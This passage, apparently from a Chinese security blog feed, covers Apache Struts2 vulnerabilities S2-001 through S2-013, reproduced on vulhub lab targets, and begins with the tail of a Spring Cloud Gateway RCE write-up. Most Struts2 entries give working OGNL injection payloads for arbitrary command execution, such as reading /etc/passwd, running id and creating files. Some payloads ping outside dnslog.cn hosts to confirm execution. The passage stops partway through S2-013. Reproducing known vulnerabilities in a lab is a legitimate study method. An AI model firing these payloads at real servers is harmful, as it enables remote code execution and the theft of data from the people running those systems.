<img src="/2022/03/04/Spring-Cloud-Gateway%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220304141945183.png" class title="image-20220304141945183">



<p>再次请求&#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;EchoSec，服务器返回服务器id值</p>
<img src="/2022/03/04/Spring-Cloud-Gateway%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220304142033285.png" class title="image-20220304142033285">





<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Spring Cloud Gateway &gt;= 3.1.1</span><br><span class="line">Spring Cloud Gateway &gt;= 3.0.7</span><br></pre></td></tr></table></figure>



<p>临时缓解措施：</p>
<p>1.如果不需要Gateway actuator endpoint，可通过 management.endpoint.gateway.enabled: false 禁用它。</p>
<p>2.如果需要actuator，则应使用 Spring Security 对其进行防护</p>
<p>可参考：<a href="https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.security%E3%80%82">https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.security。</a></p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>开发框架漏洞</category>
        <category>Spring</category>
      </categories>
      <tags>
        <tag>-Web漏洞 -Spring框架 -远程代码执行</tag>
      </tags>
  </entry>
  <entry>
    <title>Struts2漏洞集合</title>
    <url>/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/</url>
    <content><![CDATA[<h1 id="Struts2漏洞集合"><a href="#Struts2漏洞集合" class="headerlink" title="Struts2漏洞集合"></a>Struts2漏洞集合</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Apache Struts 2最初被称为WebWork 2，它是一个简洁的、可扩展的框架，可用于创建企业级Java web应用程序。设计这个框架是为了从构建、部署、到应用程序维护方面来简化整个开发周期。</p>
<p>[TOC]</p>
<h2 id="漏洞集合"><a href="#漏洞集合" class="headerlink" title="漏洞集合"></a>漏洞集合</h2><p>这里总结下关于Struct2的漏洞集合，靶场环境使用vulhub进行搭建。</p>
<h3 id="S2-001-CVE-2007-4556"><a href="#S2-001-CVE-2007-4556" class="headerlink" title="S2-001(CVE-2007-4556)"></a>S2-001(CVE-2007-4556)</h3><h4 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p>
<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>Struts 2.0.0 – Struts 2.0.8</p>
<h4 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>在登录框中按照%{xxxx}的格式输入测试的表达式</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309145120534.png" class title="image-20220309145120534">

<p>点击提交后，表达式执行成功</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309145221296.png" class title="image-20220309145221296">

<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>获取tomcat执行路径</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>获取web路径</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure>

<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309145842935.png" class title="image-20220309145842935">



<p><strong>任意命令执行</strong></p>
<p>其他命令可直接修改new java.lang.String<a href="xxx"></a>函数里面的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>

<p>执行读取&#x2F;etc&#x2F;passwd文件命令</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309150137162.png" class title="image-20220309150137162">

<h3 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h3><h4 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上</p>
<p>XWork会将GET参数的键和值利用OGNL表达式解析成Java语句，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user.address.city=Bishkek&amp;user[&#x27;favoriteDrink&#x27;]=kumys </span><br><span class="line">//会被转化成</span><br><span class="line">action.getUser().getAddress().setCity(&quot;Bishkek&quot;)  </span><br><span class="line">action.getUser().setFavoriteDrink(&quot;kumys&quot;)</span><br></pre></td></tr></table></figure>

<p>触发漏洞就是利用了这个点，再配合OGNL的沙盒绕过方法，组成了S2-003。官方对003的修复方法是增加了安全模式（沙盒），S2-005在OGNL表达式中将安全模式关闭，又绕过了修复方法。整体过程如下：</p>
<ul>
<li>S2-003 使用<code>\u0023</code>绕过s2对<code>#</code>的防御</li>
<li>S2-003 后官方增加了安全模式（沙盒）</li>
<li>S2-005 使用OGNL表达式将沙盒关闭，继续执行代码</li>
</ul>
<h4 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 - 2.1.8.1</p>
<h4 id="漏洞探测-1"><a href="#漏洞探测-1" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p><strong>创建文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 </span><br></pre></td></tr></table></figure>



<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>任意命令执行</strong></p>
<p>修改exec()中需执行的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22pwd%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1</span><br></pre></td></tr></table></figure>



<h3 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h3><h4 id="漏洞简介-2"><a href="#漏洞简介-2" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>当配置了验证规则 <ActionName>-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。<strong>也就是一般出现在表单处</strong></ActionName></p>
<p>例如这里有一个 UserAction：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(...)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line"></span><br><span class="line">(...)</span><br></pre></td></tr></table></figure>

<p>然后配置有 UserAction-validation.xml：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">validators</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">    <span class="meta-string">&quot;-//OpenSymphony Group//XWork Validator 1.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">    <span class="meta-string">&quot;http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">validators</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field-validator</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;min&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;max&quot;</span>&gt;</span>150<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">field-validator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">validators</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="漏洞版本-1"><a href="#漏洞版本-1" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 - 2.2.3</p>
<h4 id="漏洞探测-2"><a href="#漏洞探测-2" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>当用户提交 age 为字符串而非整形数值时，后端用代码拼接 <code>&quot;&#39;&quot; + value + &quot;&#39;&quot;</code> 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309153002375.png" class title="image-20220309153002375">

<p>表达式执行成功</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309153336735.png" class title="image-20220309153336735">

<h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>任意命令执行</strong></p>
<p>修改下面poc中exec()函数id参数执行其他命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure>

<p>执行命令<code>id</code>，返回信息</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309153524428.png" class title="image-20220309153524428">

<p>返回当前用户root</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309153722721.png" class title="image-20220309153722721">

<h3 id="S2-008"><a href="#S2-008" class="headerlink" title="S2-008"></a>S2-008</h3><h4 id="漏洞简介-3"><a href="#漏洞简介-3" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。</p>
<p>例如在 devMode 模式下直接添加参数<code>?debug=command&amp;expression=&lt;OGNL EXP&gt;</code>，会直接执行后面的 OGNL 表达式，因此可以直接执行命令（注意转义）</p>
<h4 id="漏洞版本-2"><a href="#漏洞版本-2" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.1.0 - 2.3.1</p>
<h4 id="漏洞探测-3"><a href="#漏洞探测-3" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-008/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22id%22%29)</span><br></pre></td></tr></table></figure>

<p>可以观察到命令已经执行，只是没有回显</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309154647936.png" class title="image-20220309154647936">

<h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>我们需要执行个在Linux上观察到的现象，这里我们使用dnslog解析记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/S2-008/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22ping%20test.mkzgrx.dnslog.cn%22%29)</span><br></pre></td></tr></table></figure>

<p>在DNS平台上可观察到解析记录，证明命令执行成功</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309155007949.png" class title="image-20220309155007949">

<h3 id="S2-009"><a href="#S2-009" class="headerlink" title="S2-009"></a>S2-009</h3><h4 id="漏洞简介-4"><a href="#漏洞简介-4" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Struts2对s2-003的修复方法是禁止静态方法调用，在s2-005中可直接通过OGNL绕过该限制，对于<code>#</code>号，同样使用编码<code>\u0023</code>或<code>\43</code>进行绕过；于是Struts2对s2-005的修复方法是禁止<code>\</code>等特殊符号，使用户不能提交反斜线。但是，如果当前action中接受了某个参数<code>example</code>，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在<code>example</code>参数中，然后使用<code>/helloword.acton?example=&lt;OGNL statement&gt;&amp;(example)(&#39;xxx&#39;)=1</code>的方法来执行它，从而绕过官方对<code>#</code>、<code>\</code>等特殊字符的防御。</p>
<p>漏洞代码:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Example5Action</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">2111967621952300611L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123; <span class="keyword">this</span>.name = name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> age; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Integer age)</span> </span>&#123; <span class="keyword">this</span>.age = age; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码没有更简单了，其接受了name参数并调用setName将其赋值给私有属性<code>this.name</code>，正是符合我们的要求。然后去<code>WEB-INF/src/java/struts-ajax.xml</code>看一下URL路由：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;ajax&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;example5&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.apache.struts2.showcase.ajax.Example5Action&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span>&gt;</span>/ajax/tabbedpanel/example5.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span>&gt;</span>/ajax/tabbedpanel/example5Ok.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>name=example5</code>，所以访问<code>http://your-ip:8080/ajax/example5.action</code>即可访问该控制器。按照原理中说到的方法，将OGNL利用代码放在name参数里，访问该URL</p>
<h4 id="漏洞版本-3"><a href="#漏洞版本-3" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.1.0 - 2.3.1.1</p>
<h4 id="漏洞探测-4"><a href="#漏洞探测-4" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p><strong>创建文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ajax/example5?age=12313&amp;name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]=true</span><br></pre></td></tr></table></figure>

<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309160925270.png" class title="image-20220309160925270">



<p>进入容器文件夹查看文件是否创建成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it 容器名/容器id bash</span><br></pre></td></tr></table></figure>

<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309161718892.png" class title="image-20220309161718892">



<h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>任意命令执行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ajax/example5?age=12313&amp;name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27ping%20test.w2ypax.dnslog.cn%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]=true</span><br></pre></td></tr></table></figure>

<p>设置属性并提交</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309161911262.png" class title="image-20220309161911262">

<p>可在dnslog平台上观察到dns记录</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309161956916.png" class title="image-20220309161956916">

<h3 id="S2-012"><a href="#S2-012" class="headerlink" title="S2-012"></a>S2-012</h3><h4 id="漏洞简介-5"><a href="#漏洞简介-5" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;S2-012&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.action.UserAction&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;redirect&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>/index.jsp?name=$&#123;name&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。</p>
<h4 id="漏洞版本-4"><a href="#漏洞版本-4" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.1.0 - 2.3.13</p>
<h4 id="漏洞探测-5"><a href="#漏洞探测-5" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p><strong>读取文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>

<p>读取文件成功</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309162448665.png" class title="image-20220309162448665">

<h4 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h4 id="任意命令执行"><a href="#任意命令执行" class="headerlink" title="任意命令执行"></a>任意命令执行</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;ping&quot;, &quot;test.gh6gw2.dnslog.cn&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>

<p>存在dnslog记录</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309162617953.png" class title="image-20220309162617953">



<h3 id="S2-013"><a href="#S2-013" class="headerlink" title="S2-013"></a>S2-013</h3><h4 id="漏洞简介-6"><a href="#漏洞简介-6" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Struts2 标签中 <code>&lt;s:a&gt;</code> 和 <code>&lt;s:url&gt;</code> 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：</p>
<ol>
<li>none - 链接不包含请求的任意参数值（默认）</li>
<li>get - 链接只包含 GET 请求中的参数和其值</li>
<li>all - 链接包含 GET 和 POST 所有参数和其值</li>
</ol>
<p><code>&lt;s:a&gt;</code>用来显示一个超链接，当<code>includeParams=all</code>的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。</p>
<h4 id="漏洞版本-5"><a href="#漏洞版本-5" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 - 2.3.14.1</p>
<h4 id="漏洞探测-6"><a href="#漏洞探测-6" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())&#125;</span><br><span class="line"></span><br><span class="line">// 或</span><br><span class="line"></span><br><span class="line">$&#123;#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())&#125;</span><br></pre></td></tr></table></figure>

<p>如：<code>http://your-ip:8080/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#39;id&#39;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(&#39;dbapp%3D&#39;%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D</code></p>
<p>返回服务器id信息</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309163452580.png" class title="image-20220309163452580">

<h4 id="漏洞利用-6"><a href="#漏洞利用-6" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>当前用户</strong></p>
